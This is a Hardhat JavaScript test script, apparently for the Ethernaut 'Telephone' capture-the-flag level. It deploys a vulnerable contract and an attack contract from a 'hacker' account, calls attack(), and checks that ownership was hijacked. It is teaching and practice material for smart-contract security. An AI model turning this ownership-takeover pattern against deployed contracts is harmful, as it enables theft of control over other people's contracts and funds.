const hre = require("hardhat");

async function main() {
  const Telephone = await hre.ethers.getContractFactory("Telephone/Telephone.sol");
  const telephone = await Telephone.deploy();
  await telephone.deployed();

  const [ownerDeployer, hacker] = await hre.ethers.getSigners();

  const AttackTelephone = await hre.ethers.getContractFactory("Telephone/AttackTelephone.sol");
  const attackTelephone = await AttackTelephone.connect(hacker).deploy(telephone.address);
  await attackTelephone.deployed();

  await attackTelephone.connect(hacker).attack();

  console.log(await telephone.owner() == hacker.address);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
